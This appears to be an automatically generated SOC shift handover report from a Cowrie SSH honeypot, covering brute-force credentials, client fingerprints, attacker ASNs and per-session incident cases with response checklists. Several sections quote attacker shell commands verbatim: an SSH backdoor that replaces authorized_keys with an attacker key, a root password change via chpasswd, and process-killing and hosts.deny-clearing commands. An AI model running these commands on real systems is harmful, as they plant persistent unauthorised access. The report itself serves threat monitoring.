# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-25 |
| **Generated At** | 2026-04-25T10:50:02Z |
| **Shift Time** | 10:50 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **229** |
| Confirmed Threats | **204** |
| False Positives Filtered | **25** (10.9%) |
| Unique Attacker IPs | **24** |
| Countries of Origin | **15** |
| High Severity Cases | **74** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **155** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **165** |
| Unique Credential Pairs | **63** |
| Unique Usernames | **26** |
| Unique Passwords | **63** |
| Successful Auth Pairs | **46** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 74 |
| `345gs5662d34` | 36 |
| `ubuntu` | 10 |
| `test` | 5 |
| `git` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 36 |
| `3245gs5662d34` | 36 |
| `Aa112211.` | 4 |
| `nPSpP4PBW0` | 3 |
| `ali17!` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 36 |
| `root` | `3245gs5662d34` | 36 |
| `root` | `Aa112211.` | 4 |
| `root` | `nPSpP4PBW0` | 3 |
| `ali` | `ali17!` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Qweqwe123` | `172.210.249.152` | 2026-04-25T09:08:57 |
| `root` | `3245gs5662d34` | `172.210.249.152` | 2026-04-25T09:09:02 |
| `root` | `Root123321.` | `172.210.249.152` | 2026-04-25T09:13:05 |
| `root` | `123456@asdf` | `172.210.249.152` | 2026-04-25T09:18:59 |
| `root` | `123456@asdf` | `197.225.146.23` | 2026-04-25T09:19:52 |
| `root` | `3245gs5662d34` | `197.225.146.23` | 2026-04-25T09:19:56 |
| `root` | `qweasd12` | `172.210.249.152` | 2026-04-25T09:22:58 |
| `root` | `Qweqwe123` | `197.225.146.23` | 2026-04-25T09:25:29 |
| `root` | `root12!@#` | `172.210.249.152` | 2026-04-25T09:26:58 |
| `root` | `qweasd12` | `197.225.146.23` | 2026-04-25T09:27:37 |
| `root` | `01020254` | `172.210.249.152` | 2026-04-25T09:32:51 |
| `root` | `01020254` | `197.225.146.23` | 2026-04-25T09:33:15 |
| `root` | `nPSpP4PBW0` | `197.225.146.23` | 2026-04-25T09:35:28 |
| `root` | `root12!@#` | `197.225.146.23` | 2026-04-25T09:36:36 |
| `root` | `Aa112211.` | `197.225.146.23` | 2026-04-25T09:37:42 |
| `root` | `------fuck------` | `49.72.111.25` | 2026-04-25T09:39:07 |
| `root` | `nPSpP4PBW0` | `172.210.249.152` | 2026-04-25T09:42:58 |
| `root` | `Root123321.` | `197.225.146.23` | 2026-04-25T09:43:19 |
| `root` | `Aa112211.` | `172.210.249.152` | 2026-04-25T09:50:54 |
| `root` | `abcabc` | `187.210.77.100` | 2026-04-25T10:01:36 |
| `root` | `3245gs5662d34` | `187.210.77.100` | 2026-04-25T10:01:45 |
| `root` | `Aa112211.` | `117.159.39.226` | 2026-04-25T10:18:35 |
| `root` | `1010` | `103.59.94.199` | 2026-04-25T10:19:28 |
| `root` | `3245gs5662d34` | `103.59.94.199` | 2026-04-25T10:19:34 |
| `root` | `Change_Me` | `117.159.39.226` | 2026-04-25T10:20:22 |
| `root` | `3245gs5662d34` | `117.159.39.226` | 2026-04-25T10:20:27 |
| `root` | `Change_Me` | `103.59.94.199` | 2026-04-25T10:22:51 |
| `root` | `nPSpP4PBW0` | `103.59.94.199` | 2026-04-25T10:24:50 |
| `root` | `1234@zxcv` | `103.59.94.199` | 2026-04-25T10:25:52 |
| `root` | `alpha001` | `103.59.94.199` | 2026-04-25T10:26:56 |
| `root` | `Aa112211.` | `103.59.94.199` | 2026-04-25T10:27:59 |
| `root` | `serverroot` | `57.128.214.238` | 2026-04-25T10:28:41 |
| `root` | `3245gs5662d34` | `57.128.214.238` | 2026-04-25T10:28:45 |
| `root` | `Qazwsx2018#` | `103.59.94.199` | 2026-04-25T10:29:02 |
| `root` | `a1111111` | `103.59.94.199` | 2026-04-25T10:33:16 |
| `root` | `Qwerty2024` | `103.59.94.199` | 2026-04-25T10:34:23 |
| `root` | `Qazwsx999#` | `103.59.94.199` | 2026-04-25T10:37:31 |
| `root` | `1020` | `103.164.9.74` | 2026-04-25T10:39:09 |
| `root` | `3245gs5662d34` | `103.164.9.74` | 2026-04-25T10:39:11 |
| `root` | `ZZzz111` | `103.59.94.199` | 2026-04-25T10:39:42 |
| `root` | `qweasd123456` | `103.59.94.199` | 2026-04-25T10:40:45 |
| `root` | `password1!` | `103.59.94.199` | 2026-04-25T10:41:48 |
| `root` | `Aa987654321` | `103.59.94.199` | 2026-04-25T10:42:48 |
| `root` | `Ab123!@#` | `152.250.243.47` | 2026-04-25T10:43:35 |
| `root` | `3245gs5662d34` | `152.250.243.47` | 2026-04-25T10:43:43 |
| `root` | `ChangeMe123!` | `103.59.94.199` | 2026-04-25T10:44:55 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **229** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 188 |
| Go SSH scanner | 2 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 110 | 6 |
| `03a80b21afa8...` | Modern SSH client | 76 | 5 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |
| `98f63c4d9c87...` | Generic scanner | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 110 | 6 | libssh-based |
| `03a80b21afa8...` | libssh | 76 | 5 | Modern SSH client |
| `95420f9d932d...` | libssh | 2 | 1 | — |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 36 | 8 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:tIy8vGuG1cHy"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `117.159.39.226`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `152.250.243.47`, `57.128.214.238`, `172.210.249.152`, `117.159.39.226`, `187.210.77.100`, `103.59.94.199`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **24** |
| Unique ASNs | **21** |
| High-Risk ASNs | **16** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS28573` | Claro NXT Telecomunicacoes Ltda | 1 | LOW |
| `AS396982` | Google LLC | 1 | LOW |
| `AS8151` | UNINET | 1 | HIGH |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 1 | HIGH |
| `AS8346` | SONATEL-AS Autonomous System | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (74)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-d5ef2e476574

| Field | Detail |
|---|---|
| **Source IP** | `172.210.249[.]152` |
| **First Seen** | 2026-04-25 09:08 |
| **Last Seen** | 2026-04-25 09:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 09:08:56` | `cowrie.session.connect` |
| `2026-04-25 09:08:56` | `cowrie.client.version` |
| `2026-04-25 09:08:56` | `cowrie.client.kex` |
| `2026-04-25 09:08:57` | `cowrie.login.success` |
| `2026-04-25 09:08:57` | `cowrie.session.params` |
| `2026-04-25 09:08:57` | `cowrie.command.input` |
| `2026-04-25 09:08:57` | `cowrie.command.failed` |
| `2026-04-25 09:08:58` | `cowrie.log.closed` |
| `2026-04-25 09:08:58` | `cowrie.session.params` |
| `2026-04-25 09:08:58` | `cowrie.command.input` |
| `2026-04-25 09:08:58` | `cowrie.session.file_download` |
| `2026-04-25 09:08:58` | `cowrie.log.closed` |
| `2026-04-25 09:09:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.249[.]152` to AbuseIPDB if not already reported
- [ ] Block `172.210.249[.]152` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7180af1b9b48

| Field | Detail |
|---|---|
| **Source IP** | `172.210.249[.]152` |
| **First Seen** | 2026-04-25 09:09 |
| **Last Seen** | 2026-04-25 09:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 09:09:01` | `cowrie.session.connect` |
| `2026-04-25 09:09:01` | `cowrie.client.version` |
| `2026-04-25 09:09:01` | `cowrie.client.kex` |
| `2026-04-25 09:09:02` | `cowrie.login.success` |
| `2026-04-25 09:09:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.249[.]152` to AbuseIPDB if not already reported
- [ ] Block `172.210.249[.]152` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4792cdac4c3

| Field | Detail |
|---|---|
| **Source IP** | `172.210.249[.]152` |
| **First Seen** | 2026-04-25 09:13 |
| **Last Seen** | 2026-04-25 09:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 09:13:04` | `cowrie.session.connect` |
| `2026-04-25 09:13:04` | `cowrie.client.version` |
| `2026-04-25 09:13:04` | `cowrie.client.kex` |
| `2026-04-25 09:13:05` | `cowrie.login.success` |
| `2026-04-25 09:13:05` | `cowrie.session.params` |
| `2026-04-25 09:13:05` | `cowrie.command.input` |
| `2026-04-25 09:13:05` | `cowrie.command.failed` |
| `2026-04-25 09:13:05` | `cowrie.log.closed` |
| `2026-04-25 09:13:06` | `cowrie.session.params` |
| `2026-04-25 09:13:06` | `cowrie.command.input` |
| `2026-04-25 09:13:06` | `cowrie.session.file_download` |
| `2026-04-25 09:13:06` | `cowrie.log.closed` |
| `2026-04-25 09:13:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.249[.]152` to AbuseIPDB if not already reported
- [ ] Block `172.210.249[.]152` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fec9f20dbe0

| Field | Detail |
|---|---|
| **Source IP** | `172.210.249[.]152` |
| **First Seen** | 2026-04-25 09:13 |
| **Last Seen** | 2026-04-25 09:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 09:13:09` | `cowrie.session.connect` |
| `2026-04-25 09:13:09` | `cowrie.client.version` |
| `2026-04-25 09:13:09` | `cowrie.client.kex` |
| `2026-04-25 09:13:10` | `cowrie.login.success` |
| `2026-04-25 09:13:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.249[.]152` to AbuseIPDB if not already reported
- [ ] Block `172.210.249[.]152` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1a363df143a

| Field | Detail |
|---|---|
| **Source IP** | `172.210.249[.]152` |
| **First Seen** | 2026-04-25 09:18 |
| **Last Seen** | 2026-04-25 09:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 09:18:58` | `cowrie.session.connect` |
| `2026-04-25 09:18:58` | `cowrie.client.version` |
| `2026-04-25 09:18:58` | `cowrie.client.kex` |
| `2026-04-25 09:18:59` | `cowrie.login.success` |
| `2026-04-25 09:19:00` | `cowrie.session.params` |
| `2026-04-25 09:19:00` | `cowrie.command.input` |
| `2026-04-25 09:19:00` | `cowrie.command.failed` |
| `2026-04-25 09:19:00` | `cowrie.log.closed` |
| `2026-04-25 09:19:00` | `cowrie.session.params` |
| `2026-04-25 09:19:00` | `cowrie.command.input` |
| `2026-04-25 09:19:01` | `cowrie.session.file_download` |
| `2026-04-25 09:19:01` | `cowrie.log.closed` |
| `2026-04-25 09:19:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.249[.]152` to AbuseIPDB if not already reported
- [ ] Block `172.210.249[.]152` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed0d3379b230

| Field | Detail |
|---|---|
| **Source IP** | `172.210.249[.]152` |
| **First Seen** | 2026-04-25 09:19 |
| **Last Seen** | 2026-04-25 09:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 09:19:04` | `cowrie.session.connect` |
| `2026-04-25 09:19:04` | `cowrie.client.version` |
| `2026-04-25 09:19:04` | `cowrie.client.kex` |
| `2026-04-25 09:19:05` | `cowrie.login.success` |
| `2026-04-25 09:19:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.249[.]152` to AbuseIPDB if not already reported
- [ ] Block `172.210.249[.]152` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d00e86f2ee2

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-25 09:19 |
| **Last Seen** | 2026-04-25 09:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 09:19:51` | `cowrie.session.connect` |
| `2026-04-25 09:19:51` | `cowrie.client.version` |
| `2026-04-25 09:19:51` | `cowrie.client.kex` |
| `2026-04-25 09:19:52` | `cowrie.login.success` |
| `2026-04-25 09:19:52` | `cowrie.session.params` |
| `2026-04-25 09:19:52` | `cowrie.command.input` |
| `2026-04-25 09:19:52` | `cowrie.command.failed` |
| `2026-04-25 09:19:53` | `cowrie.log.closed` |
| `2026-04-25 09:19:53` | `cowrie.session.params` |
| `2026-04-25 09:19:53` | `cowrie.command.input` |
| `2026-04-25 09:19:53` | `cowrie.session.file_download` |
| `2026-04-25 09:19:53` | `cowrie.log.closed` |
| `2026-04-25 09:19:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f3746fc0842

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-25 09:19 |
| **Last Seen** | 2026-04-25 09:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 09:19:55` | `cowrie.session.connect` |
| `2026-04-25 09:19:55` | `cowrie.client.version` |
| `2026-04-25 09:19:55` | `cowrie.client.kex` |
| `2026-04-25 09:19:56` | `cowrie.login.success` |
| `2026-04-25 09:19:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-201bbc4e1b25

| Field | Detail |
|---|---|
| **Source IP** | `172.210.249[.]152` |
| **First Seen** | 2026-04-25 09:22 |
| **Last Seen** | 2026-04-25 09:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 09:22:57` | `cowrie.session.connect` |
| `2026-04-25 09:22:57` | `cowrie.client.version` |
| `2026-04-25 09:22:58` | `cowrie.client.kex` |
| `2026-04-25 09:22:58` | `cowrie.login.success` |
| `2026-04-25 09:22:59` | `cowrie.session.params` |
| `2026-04-25 09:22:59` | `cowrie.command.input` |
| `2026-04-25 09:22:59` | `cowrie.command.failed` |
| `2026-04-25 09:22:59` | `cowrie.log.closed` |
| `2026-04-25 09:23:00` | `cowrie.session.params` |
| `2026-04-25 09:23:00` | `cowrie.command.input` |
| `2026-04-25 09:23:00` | `cowrie.session.file_download` |
| `2026-04-25 09:23:00` | `cowrie.log.closed` |
| `2026-04-25 09:23:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.249[.]152` to AbuseIPDB if not already reported
- [ ] Block `172.210.249[.]152` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34a17791b14d

| Field | Detail |
|---|---|
| **Source IP** | `172.210.249[.]152` |
| **First Seen** | 2026-04-25 09:23 |
| **Last Seen** | 2026-04-25 09:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 09:23:02` | `cowrie.session.connect` |
| `2026-04-25 09:23:02` | `cowrie.client.version` |
| `2026-04-25 09:23:03` | `cowrie.client.kex` |
| `2026-04-25 09:23:03` | `cowrie.login.success` |
| `2026-04-25 09:23:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.249[.]152` to AbuseIPDB if not already reported
- [ ] Block `172.210.249[.]152` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ef6c65cb427

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-25 09:25 |
| **Last Seen** | 2026-04-25 09:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
